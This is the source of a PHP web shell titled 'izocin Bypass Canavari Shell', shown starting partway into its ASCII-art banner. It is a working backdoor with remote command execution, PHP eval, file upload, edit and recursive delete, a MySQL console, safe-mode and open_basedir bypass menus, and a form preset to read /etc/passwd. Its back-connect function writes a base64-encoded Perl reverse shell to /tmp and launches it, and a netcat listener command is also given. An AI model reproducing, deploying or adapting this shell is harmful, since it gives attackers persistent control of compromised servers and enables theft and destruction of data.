color=#bcbc00>#</font><font color=#020200>#</font><font color=black>###</font><font color=#888800>#</font><font color=yellow>############</font><font color=#f9f900>#</font><font color=#272700>#</font><font color=black>#</font><font color=#f6f600>#</font><font color=yellow>#####</font><font color=#d4d400>#</font><font color=#efef00>#</font><font color=yellow>######</font><font color=#9f9f00>#</font><font color=black>###</font><font color=#454500>#</font><font color=#f0f000>#</font><font color=yellow>#######</font><font color=#c5c500>#</font><font color=#151500>#</font><font color=black>##</font><br><font color=black>##</font><font color=#070700>#</font><font color=#888800>#</font><font color=#f4f400>#</font><font color=yellow>######</font><font color=#b0b000>#</font><font color=#0c0c00>#</font><font color=black>###</font><font color=#d8d800>#</font><font color=yellow>######</font><font color=#383800>#</font><font color=#b0b000>#</font><font color=yellow>##</font><font color=#dbdb00>#</font><font color=#010100>#</font><font color=black>#</font><font color=#cdcd00>#</font><font color=yellow>###########</font><font color=#fdfd00>#</font><font color=black>##</font><font color=#060600>#</font><font color=#e6e600>#</font><font color=yellow>#############</font><font color=#f7f700>#</font><font color=#323200>#</font><font color=black>###</font><font color=#020200>#</font><font color=#cbcb00>#</font><font color=yellow>###########</font><font color=#f6f600>#</font><font color=#1e1e00>#</font><font color=black>###</font><font color=#6e6e00>#</font><font color=yellow>######</font><font color=#dddd00>#</font><font color=#ebeb00>#</font><font color=yellow>####</font><font color=#fefe00>#</font><font color=#2f2f00>#</font><font color=black>#</font><font color=#f6f600>#</font><font color=yellow>#############</font><font color=#9f9f00>#</font><font color=black>###</font><font color=#010100>#</font><font color=#646400>#</font><font color=#fcfc00>#</font><font color=yellow>#####</font><font color=#dfdf00>#</font><font color=#272700>#</font><font color=black>###</font><br><font color=black>###</font><font color=#070700>#</font><font color=#3e3e00>#</font><font color=#b5b500>#</font><font color=#f2f200>#</font><font color=yellow>####</font><font color=#fdfd00>#</font><font color=#7a7a00>#</font><font color=black>###</font><font color=#d2d200>#</font><font color=yellow>######</font><font color=#383800>#</font><font color=#b0b000>#</font><font color=yellow>##</font><font color=#a6a600>#</font><font color=black>##</font><font color=#cdcd00>#</font><font color=yellow>###########</font><font color=#fdfd00>#</font><font color=black>###</font><font color=#4a4a00>#</font><font color=#616100>#############</font><font color=#535300>#</font><font color=#030300>#</font><font color=black>###</font><font color=#404000>#</font><font color=#fcfc00>#</font><font color=yellow>####</font><font color=#fefe00>#</font><font color=#bcbc00>#</font><font color=#fefe00>#</font><font color=yellow>#####</font><font color=#676700>#</font><font color=black>###</font><font color=#4c4c00>#</font><font color=yellow>######</font><font color=#636300>#</font><font color=#292900>#</font><font color=#d7d700>#</font><font color=yellow>##</font><font color=#fefe00>#</font><font color=#b9b900>#</font><font color=#050500>#</font><font color=black>#</font><font color=#f6f600>#</font><font color=yellow>#############</font><font color=#9f9f00>#</font><font color=black>####</font><font color=#050500>#</font><font color=#bcbc00>#</font><font color=yellow>#####</font><font color=#6e6e00>#</font><font color=black>####</font><br><font color=black>#####</font><font color=#0a0a00>#</font><font color=#676700>#</font><font color=#fafa00>#</font><font color=yellow>####</font><font color=#bcbc00>#</font><font color=black>###</font><font color=#bebe00>#</font><font color=yellow>######</font><font color=#383800>#</font><font color=#b0b000>#</font><font color=yellow>##</font><font color=#767600>#</font><font color=black>##</font><font color=#cdcd00>#</font><font color=yellow>###</font><font color=#d9d900>#</font><font color=yellow>#######</font><font color=#fdfd00>#</font><font color=black>######################</font><font color=#a8a800>#</font><font color=yellow>#####</font><font color=#f2f200>#</font><font color=#979700>#</font><font color=#f9f900>#</font><font color=yellow>#####</font><font color=#baba00>#</font><font color=#010100>#</font><font color=black>##</font><font color=#383800>#</font><font color=yellow>######</font><font color=#757500>#</font><font color=#7b7b00>#</font><font color=#f2f200>#</font><font color=yellow>#</font><font color=#fcfc00>#</font><font color=#a1a100>#</font><font color=#1b1b00>#</font><font color=black>##</font><font color=#f6f600>#</font><font color=yellow>#############</font><font color=#9f9f00>#</font><font color=black>#####</font><font color=#aeae00>#</font><font color=yellow>#####</font><font color=#5d5d00>#</font><font color=black>####</font><br><font color=black>###</font><font color=#080800>#</font><font color=#191900>#</font><font color=#262600>#</font><font color=#525200>#</font><font color=#f1f100>#</font><font color=yellow>####</font><font color=#7a7a00>#</font><font color=black>###</font><font color=#868600>#</font><font color=yellow>######</font><font color=#979700>#</font><font color=#d8d800>#</font><font color=yellow>#</font><font color=#f9f900>#</font><font color=#303000>#</font><font color=black>##</font><font color=#cdcd00>#</font><font color=yellow>###</font><font color=#202000>#</font><font color=#b5b500>#</font><font color=#fefe00>#</font><font color=yellow>#####</font><font color=#fdfd00>#</font><font color=black>#####################</font><font color=#212100>#</font><font color=#f9f900>#</font><font color=yellow>#####</font><font color=#fefe00>#</font><font color=#fdfd00>#</font><font color=yellow>######</font><font color=#f6f600>#</font><font color=#202000>#</font><font color=black>##</font><font color=#0f0f00>#</font><font color=#fafa00>#</font><font color=yellow>#####</font><font color=#fbfb00>#</font><font color=#fdfd00>#</font><font color=yellow>##</font><font color=#a7a700>#</font><font color=#0c0c00>#</font><font color=black>###</font><font color=#f6f600>#</font><font color=yellow>##</font><font color=#eaea00>#</font><font color=yellow>####</font><font color=#f9f900>#</font><font color=yellow>#####</font><font color=#9f9f00>#</font><font color=black>#####</font><font color=#aeae00>#</font><font color=yellow>#####</font><font color=#5d5d00>#</font><font color=black>####</font><br><font color=black>###</font><font color=#3b3b00>#</font><font color=#c9c900>#</font><font color=#d5d500>#</font><font color=#f2f200>#</font><font color=yellow>##</font><font color=#fefe00>#</font><font color=#f8f800>#</font><font color=#bdbd00>#</font><font color=#141400>#</font><font color=black>###</font><font color=#232300>#</font><font color=#caca00>#</font><font color=#f9f900>#</font><font color=yellow>######</font><font color=#f9f900>#</font><font color=#a0a000>#</font><font color=#050500>#</font><font color=black>##</font><font color=#cdcd00>#</font><font color=yellow>###</font><font color=#090900>#</font><font color=#181800>#</font><font color=#a6a600>#</font><font color=#fcfc00>#</font><font color=yellow>####</font><font color=#fdfd00>#</font><font color=black>#####################</font><font color=#838300>#</font><font color=yellow>######</font><font color=#eeee00>#</font><font color=#f7f700>#</font><font color=#eaea00>#</font><font color=yellow>######</font><font color=#656500>#</font><font color=black>##</font><font color=#070700>#</font><font color=#e3e300>#</font><font color=yellow>#####</font><font color=#fafa00>#</font><font color=yellow>###</font><font color=#f6f600>#</font><font color=#909000>#</font><font color=#0b0b00>#</font><font color=black>##</font><font color=#f6f600>#</font><font color=yellow>##</font><font color=olive>#</font><font color=#d3d300>#</font><font color=yellow>##</font><font color=#f4f400>#</font><font color=#aeae00>#</font><font color=yellow>#####</font><font color=#9f9f00>#</font><font color=black>#####</font><font color=#aeae00>#</font><font color=yellow>#####</font><font color=#5d5d00>#</font><font color=black>####</font><br><font color=black>###</font><font color=#191900>#</font><font color=#d8d800>#</font><font color=#dede00>#</font><font color=#dada00>#</font><font color=#cece00>#</font><font color=#b4b400>#</font><font color=#959500>#</font><font color=#565600>#</font><font color=#060600>#</font><font color=black>#####</font><font color=#0a0a00>#</font><font color=#616100>#</font><font color=#a7a700>#</font><font color=#cece00>#</font><font color=#dcdc00>#</font><font color=#dddd00>#</font><font color=#d1d100>#</font><font color=#aeae00>#</font><font color=#5f5f00>#</font><font color=#050500>#</font><font color=black>###</font><font color=#c5c500>#</font><font color=#f9f900>#</font><font color=#f8f800>#</font><font color=#eaea00>#</font><font color=#080800>#</font><font color=black>#</font><font color=#060600>#</font><font color=#868600>#</font><font color=#ebeb00>#</font><font color=#f8f800>#</font><font color=#f9f900>#</font><font color=#f8f800>#</font><font color=#e9e900>#</font><font color=black>####################</font><font color=#070700>#</font><font color=#dbdb00>#</font><font color=#f5f500>#</font><font color=#f6f600>####</font><font color=#f2f200>#</font><font color=#4c4c00>#</font><font color=#4e4e00>#</font><font color=#1e1e00>#</font><font color=#f5f500>#</font><font color=#fdfd00>#</font><font color=#fefe00>###</font><font color=yellow>#</font><font color=#baba00>#</font><font color=black>###</font><font color=#999900>#</font><font color=#d2d200>#</font><font color=#d6d600>###</font><font color=#cbcb00>#</font><font color=#757500>#</font><font color=#caca00>#</font><font color=yellow>##</font><font color=#f1f100>#</font><font color=#cece00>#</font><font color=#5f5f00>#</font><font color=black>##</font><font color=#d2d200>#</font><font color=#dede00>##</font><font color=#4b4b00>#</font><font color=#2b2b00>#</font><font color=#d0d000>#</font><font color=#dddd00>#</font><font color=#737300>#</font><font color=#626200>#</font><font color=#dede00>#####</font><font color=#898900>#</font><font color=black>#####</font><font color=#838300>#</font><font color=#c2c200>#####</font><font color=#444400>#</font><font color=black>####</font><br><font color=black>###</font><font color=#020200>#</font><font color=#222200>#</font><font color=#242400>#</font><font color=#222200>#</font><font color=#1c1c00>#</font><font color=#111100>#</font><font color=#050500>#</font><font color=black>#########</font><font color=#0b0b00>#</font><font color=#1d1d00>#</font><font color=#232300>##</font><font color=#1e1e00>#</font><font color=#0e0e00>#</font><font color=black>#####</font><font color=#252500>#</font><font color=#303000>##</font><font color=#292900>#</font><font color=#010100>#</font><font color=black>##</font><font color=#080800>#</font><font color=#2a2a00>#</font><font color=#303000>###</font><font color=#292900>#</font><font color=black>####################</font><font color=#030300>#</font><font color=#2d2d00>#</font><font color=#2f2f00>#####</font><font color=#2d2d00>#</font><font color=#060600>#</font><font color=black>#</font><font color=#020200>#</font><font color=#3d3d00>#</font><font color=#474700>#</font><font color=#4a4a00>#</font><font color=#4d4d00>#</font><font color=#4f4f00>#</font><font color=#515100>#</font><font color=#494900>#</font><font color=#020200>#</font><font color=black>##</font><font color=#131300>#</font><font color=#1e1e00>#</font><font color=#202000>###</font><font color=#1b1b00>#</font><font color=#070700>#</font><font color=#1e1e00>#</font><font color=#727200>#</font><font color=#595900>#</font><font color=#2f2f00>#</font><font color=#1c1c00>#</font><font color=#0a0a00>#</font><font color=black>##</font><font color=#212100>#</font><font color=#242400>##</font><font color=#0a0a00>#</font><font color=#010100>#</font><font color=#1e1e00>#</font><font color=#232300>#</font><font color=#0a0a00>#</font><font color=#0f0f00>#</font><font color=#242400>#####</font><font color=#161600>#</font><font color=black>#####</font><font color=#0f0f00>#</font><font color=#171700>#####</font><font color=#070700>#</font><font color=black>####</font>
</font>
<br><br><br>
<?PHP echo '<div style="background-color:#101010;color:yellow"><b>Safe-Mode : </font>'.$Safe;?>
<Form action="?id=sysbypass&izo=cp" method="post">
<font color="yellow" size="3"><b>Path:<b></font><Input type="text" name="file" style="background-color:black;color:#FF3300;width:200px;" value="/etc/passwd"><br><font color="yellow" size=3><br><b>File</b></font><input checked type="radio" name="type" value="file"><font color="yellow" size=3>     <b>Dir</font><input type="radio" name="type" value="Dir"><br><br><br><Input type="submit" value="Go!" style="width:100px;background-color:black;color:yellow">
</font>
</Form>
<?PHP print $Res;?>
<table align="center" style="color:lime">By Nitrojen26</table>
</Center>
</Body>
</Html>

<?PHP

}


//serverdeki siteler
function esiteler()
{

?>
<iframe style="background:red" src ="http://www.yougetsignal.com/tools/web-sites-on-web-server/php/get-web-sites-on-web-server-json-data.php?remoteAddress=<?php echo getenv("HTTP_HOST"); ?>"
height="600"
width="100%">
</iframe>
<?php

}


//Working with MySQL
function emysql()
{
	$cquery = $_POST['query'];
	$querys = @explode(';',$cquery);
	$dbhost = $_POST['dbhost']?$_POST['dbhost']:"localhost";
	$dbport = $_POST['dbport']?$_POST['dbport']:"3306";
	$dbuser = $_POST['dbuser'];
	$dbpass = $_POST['dbpass'];
	$dbname = $_POST['dbname'];
	if ($cquery  == "") {
		$cquery  = "-- SHOW DATABASES;\n-- SHOW TABLES FROM <database>;\n-- SHOW COLUMNS FROM <table>;";
	}
	echo '
	<center><h3> Working with MySQL </h3></center>
	<center>
	<form method="POST" action="">
	<input type="hidden" name="id" value="mysql">
	DBHost: <input type="text" size="8" name="dbhost" value="',$dbhost,'" class="input" />&nbsp;
	DBPort: <input type="text" size="5" name="dbport" value="',$dbport,'" class="input" />&nbsp;
	DBUser: <input type="text" size="10" name="dbuser" value="',$dbuser,'" class="input" />&nbsp;
	DBPass: <input type="text" size="10" name="dbpass" value="',$dbpass,'" class="input" />&nbsp;
	DBName: <input type="text" size="10" name="dbname" value="',$dbname,'" class="input" /><br><br>
	<textarea name ="query" rows="7" cols=90 class="textarea">',$cquery,'</textarea><br><br>
	<input type="submit" name="go" value="     Go     " class="button">
	</form>';
	if($_POST['go']) {
		$connect = @mysql_connect($dbhost.":".$dbport, $dbuser, $dbpass);

		if (!$connect)	{ echo '<textarea rows=3 cols=80 class="textarea">Could not connect: ',mysql_error(),'</textarea>';	}
		else {
			@mysql_select_db($dbname, $connect);
			echo '<div style="overflow:auto; height:400px;width:1000px;">';
			foreach($querys as $num=>$query){
				if(strlen($query)>5){
					echo '<font face=Verdana size=-2 color=orange><b>Query#'.$num.' : '.htmlspecialchars($query).'</b></font><br>';
					$res = @mysql_query($query,$connect);
					$error = @mysql_error($connect);
					if($error) { echo '<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>'.$error.'</b></font></td></tr></table><br>'; }
					else {
						if (@mysql_num_rows($res) > 0){
							$sql2 = $sql = $keys = $values = '';
							while (($row = @mysql_fetch_assoc($res))){
								$keys = @implode('&nbsp;</b></font></td><td bgcolor=blue><font color=white face=Verdana size=-2><b>&nbsp;', @array_keys($row));
								$values = @array_values($row);
								foreach($values as $k=>$v) { $values[$k] = htmlspecialchars($v);}
								$values = @implode('&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;',$values);
								$sql2 .= '<tr><td><font face=Verdana size=-2>&nbsp;'.$values.'&nbsp;</font></td></tr>';
							}
							echo '<table width=100%>';
							$sql  = '<tr><td bgcolor=blue><font face=Verdana color=white size=-2><b>&nbsp;'.$keys.'&nbsp;</b></font></td></tr>';
							$sql .= $sql2;
							echo $sql;
							echo '</table><br>';
						}
						else { if(($rows = @mysql_affected_rows($connect))>=0) { echo '<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>'.$rows.'</b></font></td></tr></table><br>'; } }
					}
					@mysql_free_result($res);
				}
			}
			echo '</div><br>';
			@mysql_close($connect);
		}
	}
}


//Back Connect
function eback()
{
	$bc_perl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
	echo '
	<p align="center"><font size="5"><b> Back Connecting </b></font></p>
	<p align="center"><font color="#DD8008">Run NetCat on your machine:</font><i><font color="#FF0000"> nc -l -p 1542</font></i>
	</p><br><hr><br><p align="center"><font color="#DD8008">Then input your IP and Port</font></p>
	<div align="center"><form method="POST" action="">
	<input type="text" name="pip" value="',$_SERVER['REMOTE_ADDR'],'" class="input" /> :
	<input type="text" name="pport" size="5" value="1542" class="input" /> <br><br>
	<input type="text" name="ppath" value="/tmp" class="input" /><br><br>
	<input type="submit" value=" Connect " class="button" />
	</form></div>';
	$pip=$_POST['pip'];		$pport=$_POST['pport'];
	if ($pip <> '') {
		$fp=fopen($_POST['ppath'].DS.rand(0,10).'bc_perl_enhack.pl', 'w');
		if (!$fp){
			$result = 'Error: couldn\'t write file to open socket connection';
		} else {
			@fputs($fp,@base64_decode($bc_perl));
			fclose($fp);
			$result = ex('perl '.$_POST['ppath'].'/bc_perl_enhack.pl '.$pip.' '.$pport.' &');
		}
	}
}


//File Edit
function fedit()
{
	$fedit=$_GET['fedit'];
	if(is_file($fedit)) {
		if ($fedit != "" ){
			$fedit=realpath($fedit);
			$lines = file($fedit);
			echo '
			<center><br><form action="" method="POST">
			<textarea name="savefile" rows="33" cols="100">' ;

			foreach ($lines as $line_num => $line) {
				echo htmlspecialchars($line);
			}
			echo '
			</textarea><br><br>
			<input type="text" name="filepath"  size="60" value="',$fedit,'" class="input" />&nbsp;
			<input type="submit" value=" Save " class="button" /></form>';
			$savefile=stripslashes($_POST['savefile']);
			$filepath=realpath($_POST['filepath']);
			if ($savefile <> "") {
				$fp=@fopen("$filepath","w+");
				if($fp){
					fwrite($fp,"") ;
					fwrite($fp,$savefile) ;
					fclose($fp);
					echo '<script language="javascript"> alert("File Saved!")</script>';
				} else {
					echo '<script language="javascript"> alert("Save Failed!")</script>';
				}
				echo '<script language="javascript"> window.location = "http://'.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI'].'"</script>';
			}
			exit();
		}
	}
	else {
		echo '<u>',$fedit,'</u> is not file. <br />
		<a href="javascript:history.go(-1)"><-- back</a>
		';
	}
}


// Execute
function ex($param) {
	$res = '';
	if (!empty($param)){
		if(function_exists('exec'))	{
			@exec($param,$res);
			$res = join("\n",$res);
		}
		elseif(function_exists('shell_exec'))	{
			$res = @shell_exec($param);
		}
		elseif(function_exists('system'))	{
			@ob_start();
			@system($param);
			$res = @ob_get_contents();
			@ob_end_clean();
		}
		elseif(function_exists('passthru'))	{
			@ob_start();
			@passthru($param);
			$res = @ob_get_contents();
			@ob_end_clean();
		}
		elseif(@is_resource($f = @popen($param,"r")))	{
			$res = "";
			while(!@feof($f)) { $res .= @fread($f,1024); }
			@pclose($f);
		}
	}
	return $res;
}

//Upload File
$rpath=@$_POST['Fupath'];
if ($rpath <> "") {
	$uploadfile = $rpath."/" . $_FILES['userfile']['name'];
	if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
		echo '<script language="javascript"> alert("\:D Upload successfully!")</script>';
	} else {
		echo '<script language="javascript"> alert("\:( Upload Failed!")</script>';
	}
}

//Delete file
$frpath=@$_GET['fdelete'];

function rmdirr($dirname)
{
    // Sanity check
    if (!file_exists($dirname)) {
        return false;
    }

    // Simple delete for a file
    if (is_file($dirname) || is_link($dirname)) {
        return unlink($dirname);
    }

    // Loop through the folder
    $dir = dir($dirname);
    while (false !== $entry = $dir->read()) {
        // Skip pointers
        if ($entry == '.' || $entry == '..') {
            continue;
        }

        // Recurse
        rmdirr($dirname . DIRECTORY_SEPARATOR . $entry);
    }

    // Clean up
    $dir->close();
    return rmdir($dirname);
}

if ($frpath <> "") {
	if(rmdirr($frpath)) {
		echo '<script language="javascript"> alert("Done! Press F5 to refresh")</script>';
	} else {
		echo '<script language="javascript"> alert("Fail! Press F5 to refresh")</script>';
	}
	echo '<script language="javascript"> history.back(2)</script>';
	exit(0);
}
?>

<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>:: izleyici security fucker shell ::</title>
<style>
<!--
body {
	font-family: Tahoma; font-size: 8pt; color:#00FF00;
	background-color:#000;
}
.td {
	font-size:80%;
}
a:link {
	text-decoration: none;
	color: #0080FF
}
a:visited {
	text-decoration: none;
	color: #0080FF
}
a:active {
	text-decoration: none;
	color: #0080FF
}
a:hover {
	text-decoration: underline overline;
	color: #FF0000
}

.input {
	border:  1px solid #0c9904 ;
	BACKGROUND-COLOR: #333333;
	font: 10pt tahoma;
	color: #ffffff;
}

.button {
	font-size: 13px;
	color:#0c9904;
	BACKGROUND-COLOR: #333333;
	border:  1px solid #0c9904;
}

.textarea {
	border:  1px solid #0c9904 ;
	BACKGROUND-COLOR: #333333;
	font: Fixedsys bold;
	color: #ffffff;
}

#phpinfo {
	width:80%;
	font-size:80%;
	padding-left10px;
}
#phpinfo table ,
#phpinfo td ,
#phpinfo tr {
	border:1px solid #9fe3a2;
}
#phpinfo pre {}
#phpinfo a:link {
	color:red;
}
#phpinfo a:hover {}
#phpinfo table {}
#phpinfo .center {}
#phpinfo .center table {}
#phpinfo .center th {}
#phpinfo td, th {}
#phpinfo h1 {
	font-size:120%;
}
#phpinfo h2 {
	text-decoration:underline;
	color:#75d584;
}
#phpinfo .p {
 font-size:90%;
 color:red;
}
#phpinfo .e {
	font-size:80%;
}
#phpinfo .h {
}
#phpinfo .v {
	font-size:75%;
	color:#3e9e25;
}
#phpinfo .vr {}
#phpinfo img {}
#phpinfo hr {}
-->
</style>
</head>

<body>
<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE);


// Change mode
$fchmod=$_GET['fchmod'];
if ($fchmod <> "" ){
	$fchmod=realpath($fchmod);
	echo '<center><font size="3"><br>
	Chang mode ',$fchmod,'<br>
	<form method="POST" action=""><br>
	<br>
	<input type="text" name="mode" size="4" class="input" />&nbsp;
	<input type="submit" value="chmod" class="button" />
	</form><br>';
	$mode=$_POST['mode'];
	if ($mode != ""){
		if(chmod($fchmod , $mode)) {
			echo "Successfully";
		} else {
			echo "Permission denied";
		}
	}
	echo '</font>';
	exit();
}
?>

<div align="center">
	<p align="center">
		<font face=Webdings size=10><b>!</b></font>
		<SPAN style="FONT-SIZE: 23pt; COLOR: #00CCFF; FONT-FAMILY: Impact">&nbsp;izocin Bypass Canavari Shell&nbsp;</SPAN>
		<font face=Webdings size=10><b>!</b></font>
		<br/>Released 15.08.2010
	</p>
	<table border="1" width="98%" style="border: 1px solid #0080FF" cellspacing="0" cellpadding="0" height="600">
		<tr>
			<td valign="top" rowspan="2">
				<p align="center"><b>
					<br><a href="?"><img border="0" src="http://img355.imageshack.us/img355/9250/jutomsec3.png"></a>
				</p>
				<p align="center">=====[~]=====</p>
				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=fm&dir=<?php	echo getcwd();	?>	">File Manager</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=cmd">Web Command</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=eval">PHP Evaluator</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=529b&bypass=cp">5.2.11 5.3.0 symlink</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=priv8">Safe Modu Offla</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=obypass&opera=cp">Openbasedir Bypass</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="green">
					<a href="?id=decode">Vbulletin config decoder</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=php4">Php 4 Back</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=444">Php 4.4.x Bypass</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=cgi">Perl cgi</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=lns">ln -s bypass</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=apachi">Apachi Bypass</a>
				</font></b></p>


				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=izbypass&ali=cp1">izocin Bypass</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=sysbypass&izo=cp">Symlink Nitrojen</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=siteler">serverdeki siteler</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="">Cpanel Brute</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=bcon">Back Connect</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=mysql">MySQL Query</a>
				</font></b></p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=info">Server Infos</a>
				</font></b></p>

				<p align="center">=====[~]=====</p>

				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
                                       <img border="0" src="http://img355.imageshack.us/img355/9250/jutomsec3.png"></a>
				</font></b></p>
					<img border="0" src="http://priv8.iblogger.org/s.php"></a>
				</font></b></p>
			</td>
			<td valign="top" height="500" width="85%" style="border: 1px solid #0080FF" align="left">
			<?php
			// swich to function called base on id
			$cmdid = $_GET['id'];
			switch ($cmdid) {
				// File Manager
				case 'fm':
					fileman ();
					break;
				// Command Line
				case 'cmd':
					wcom();
					break;
				// PHP Eval
				case 'eval':
					eeval();
					break;
				// 5.2.11 5.3.0 symlink
				case '529b':
					e529b();
					break;
				// Safe Modu Offla
				case 'priv8':
					epriv8();
					break;
				// Openbasedir Bypass
				case 'obypass':
					eobypass();
					break;
				// Vbulletin config decoder
				case 'decode':
					edecode();
					break;				
				// Php 4 Back
				case 'php4':
					ephp4();
					break;
				// Php 4.4.x Bypass
				case '444':
					e444();
					break;
				// Perl cgi
				case 'cgi':
					ecgi();
					break;
				// ln -s bypass
				case 'lns':
					elns();
					break;
				// Apachi Bypass
				case 'apachi':
					eapachi();
					break;
				// izocin Bypass
				case 'izbypass':
					eizbypass();
					break;
				//Symlink Nitrojen
				case 'sysbypass':
					esysbypass();
					break;
				//serverdeki siteler
				case 'siteler':
					esiteler();
					break;
                                // Work with MySQL
				case 'mysql':
					emysql();
					break;
				// Back connect
				case 'bcon':
					eback();
					break;
				// File Edit
				case 'fedit':
					fedit();
					break;
				// Php Info
				case 'info':
					info();
					break;
				// Default
				default: def();
			}
			//*******************************************************

			?>
			</td>
		</tr>
		<tr>
			<td style="border: 1px solid #0080FF">
			<p align="center">
			<font color="#FF0000" size="2"><b>:::::::::::::::: [ :: Copyright &copy 2010 - yürürlüge giris tarihi</a> by <a href="http://redsecurity.iblogger.org">Red Security Team</a> :: ] :::::::::::::::: </b></font>
			</p></td>
		</tr>
	</table>
</div>
</font>
</body>
</html>